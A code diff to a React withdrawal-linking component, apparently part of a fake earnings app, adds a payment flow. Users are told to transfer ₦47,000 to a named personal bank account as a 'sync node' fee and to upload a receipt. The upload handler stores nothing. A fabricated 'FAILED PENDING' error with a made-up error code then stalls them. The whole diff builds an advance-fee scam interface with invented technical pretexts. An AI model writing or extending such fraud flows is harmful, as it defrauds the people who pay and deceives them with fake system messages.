@@ -9,11 +9,12 @@ interface LinkWithdrawAccountProps {
 }
 
 const LinkWithdrawAccount: React.FC<LinkWithdrawAccountProps> = ({ user, onBack }) => {
-  const [step, setStep] = useState<'form' | 'payment'>('form');
+  const [step, setStep] = useState<'form' | 'notice' | 'instructions' | 'upload' | 'status'>('form');
   const [accountName, setAccountName] = useState('');
   const [bankName, setBankName] = useState('');
   const [accountNumber, setAccountNumber] = useState('');
   const [loading, setLoading] = useState(false);
+  const [proofFile, setProofFile] = useState<File | null>(null);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -22,14 +23,198 @@ const LinkWithdrawAccount: React.FC<LinkWithdrawAccountProps> = ({ user, onBack 
       return;
     }
     setLoading(true);
-    // Simulate a brief delay
     setTimeout(() => {
       setLoading(false);
-      setStep('payment');
-    }, 1500);
+      setStep('notice');
+    }, 1200);
   };
 
-  if (step === 'payment') {
+  const handleUploadProof = () => {
+    if (!proofFile) {
+      alert('Please select a payment receipt photo');
+      return;
+    }
+    setLoading(true);
+    setTimeout(() => {
+      setLoading(false);
+      setStep('status');
+    }, 2000);
+  };
+
+  if (step === 'status') {
+    return (
+      <div className="px-4 py-8 space-y-8 animate-in fade-in zoom-in duration-500 pb-24 text-center">
+        <div className="flex justify-center">
+          <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center border-2 border-red-500/50 animate-pulse">
+            <Icons.Clock size={48} className="text-red-500" />
+          </div>
+        </div>
+
+        <div className="space-y-4">
+          <h2 className="text-3xl font-black text-white uppercase tracking-tighter leading-tight">
+            Integration <span className="text-red-500">Failed Pending</span>
+          </h2>
+          <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-2xl">
+            <p className="text-red-400 text-xs font-bold uppercase tracking-widest">Awaiting Manual Verification</p>
+          </div>
+          <p className="text-gray-400 text-sm leading-relaxed px-4">
+            Your payment proof has been received but the database synchronization status is currently <span className="text-white font-bold">FAILED PENDING</span>. 
+          </p>
+          <p className="text-xs text-gray-500 italic">
+            Please wait 4-12 hours for our network engineers to manually validate your transfer and activate your withdrawal node.
+          </p>
+        </div>
+
+        <div className="pt-6">
+          <button 
+            onClick={onBack}
+            className="w-full py-5 bg-gray-900 border border-white/10 text-white font-black rounded-2xl active:scale-[0.98] transition-all uppercase tracking-widest text-sm"
+          >
+            Return to Dashboard
+          </button>
+        </div>
+
+        <div className="flex items-center justify-center space-x-2 text-[10px] text-gray-600 font-bold uppercase">
+          <Icons.ShieldCheck size={14} className="text-red-500" />
+          <span>Error Code: SYNC_PEND_403</span>
+        </div>
+      </div>
+    );
+  }
+
+  if (step === 'upload') {
+    return (
+      <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-right-4 duration-500 pb-24">
+        <div className="space-y-2 text-center">
+          <h2 className="text-2xl font-black text-white uppercase tracking-tight">Upload Proof</h2>
+          <p className="text-sm text-gray-400">Please upload a clear screenshot of your bank transfer</p>
+        </div>
+
+        <div className="bg-gray-900/50 border-2 border-dashed border-blue-500/30 rounded-[2.5rem] p-10 text-center space-y-4">
+           {proofFile ? (
+             <div className="space-y-4">
+                <div className="mx-auto w-20 h-20 bg-green-500/10 rounded-2xl flex items-center justify-center text-green-500">
+                  <Icons.CheckCircle size={40} />
+                </div>
+                <p className="text-white font-bold text-sm truncate px-4">{proofFile.name}</p>
+                <button 
+                  onClick={() => setProofFile(null)}
+                  className="text-xs text-red-400 font-bold uppercase tracking-widest"
+                >
+                  Remove & Retry
+                </button>
+             </div>
+           ) : (
+             <label className="cursor-pointer block space-y-4">
+                <input 
+                  type="file" 
+                  accept="image/*" 
+                  className="hidden" 
+                  onChange={(e) => e.target.files && setProofFile(e.target.files[0])}
+                />
+                <div className="mx-auto w-20 h-20 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-400">
+                   <Icons.Upload size={32} />
+                </div>
+                <div>
+                  <p className="text-white font-bold">Tap to Upload Receipt</p>
+                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mt-1">PNG, JPG or JPEG</p>
+                </div>
+             </label>
+           )}
+        </div>
+
+        <div className="space-y-4 pt-4">
+          <button 
+            disabled={!proofFile || loading}
+            onClick={handleUploadProof}
+            className={`w-full py-5 rounded-2xl font-black transition-all uppercase tracking-widest text-sm flex items-center justify-center space-x-2 ${proofFile && !loading ? 'bg-blue-600 text-white shadow-xl shadow-blue-600/20 active:scale-[0.98]' : 'bg-gray-800 text-gray-500 cursor-not-allowed'}`}
+          >
+            {loading ? (
+              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+            ) : (
+              <>
+                <Icons.CheckCircle size={18} />
+                <span>Submit Proof</span>
+              </>
+            )}
+          </button>
+          
+          <button 
+            onClick={() => setStep('instructions')}
+            className="w-full py-4 text-gray-500 font-bold uppercase tracking-widest text-xs"
+          >
+            Go Back
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  if (step === 'instructions') {
+    return (
+      <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-right-4 duration-500 pb-24">
+        <div className="space-y-2 text-center">
+          <h2 className="text-2xl font-black text-white uppercase tracking-tight">Payment Details</h2>
+          <p className="text-sm text-gray-400">Transfer exactly <span className="text-white font-bold text-lg">₦47,000</span> to the details below</p>
+        </div>
+
+        <div className="bg-red-600 text-white p-3 rounded-xl text-center font-black text-[10px] uppercase tracking-tighter shadow-lg animate-pulse">
+           DONT USE OPAY AND PALMPAY FOR THIS PAYMENT. OTHER BANKS LIKE MONIEPOINT E.T.C ARE ALLOWED.
+        </div>
+
+        <div className="bg-gradient-to-br from-gray-900 to-black border border-white/5 rounded-[2.5rem] p-8 space-y-6 shadow-2xl">
+           <div className="space-y-1">
+              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Management Bank</p>
+              <p className="text-xl font-bold text-white tracking-tight">Access bank</p>
+           </div>
+           
+           <div className="space-y-1">
+              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Account Number</p>
+              <div className="flex items-center justify-between">
+                <p className="text-3xl font-black text-blue-400 tracking-wider">1944539322</p>
+                <button 
+                  onClick={() => {navigator.clipboard.writeText('1944539322'); alert('Account Number Copied')}}
+                  className="p-2 bg-blue-600/10 text-blue-400 rounded-lg active:scale-90 transition-all"
+                >
+                  <Icons.Copy size={16} />
+                </button>
+              </div>
+           </div>
+
+           <div className="space-y-1">
+              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Account Name</p>
+              <p className="text-lg font-bold text-white uppercase">Marvelous Michael O</p>
+           </div>
+        </div>
+
+        <div className="bg-amber-400/5 border border-amber-400/10 p-4 rounded-2xl flex items-start space-x-3">
+           <Icons.AlertTriangle size={20} className="text-amber-400 shrink-0 mt-0.5" />
+           <p className="text-[10px] text-gray-400 leading-relaxed italic">
+             Important: After transfer, you MUST upload your payment receipt. Failure to upload proof will result in synchronization timeouts.
+           </p>
+        </div>
+
+        <div className="space-y-4 pt-4">
+          <button 
+            onClick={() => setStep('upload')}
+            className="w-full py-5 bg-blue-600 text-white font-black rounded-2xl shadow-xl shadow-blue-600/20 active:scale-[0.98] transition-all uppercase tracking-widest text-sm flex items-center justify-center space-x-2"
+          >
+            <span>I Have Made Payment</span>
+            <Icons.ArrowRight size={18} />
+          </button>
+          
+          <button 
+            onClick={() => setStep('notice')}
+            className="w-full py-4 text-gray-500 font-bold uppercase tracking-widest text-xs"
+          >
+            Go Back
+          </button>
+        </div>
+      </div>
+    );
+  }
+
+  if (step === 'notice') {
     return (
       <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-24 text-center">
         <div className="flex justify-center">
@@ -60,7 +245,7 @@ const LinkWithdrawAccount: React.FC<LinkWithdrawAccountProps> = ({ user, onBack 
         <div className="space-y-4">
           <button 
             className="w-full py-5 bg-amber-400 text-black font-black rounded-2xl shadow-xl shadow-amber-400/20 active:scale-[0.98] transition-all uppercase tracking-widest text-sm"
-            onClick={() => alert("Please contact support at t.me/CHIX9JAservice to get the payment details for your dedicated sync node.")}
+            onClick={() => setStep('instructions')}
           >
             PROCEED TO PAYMENT
           </button>
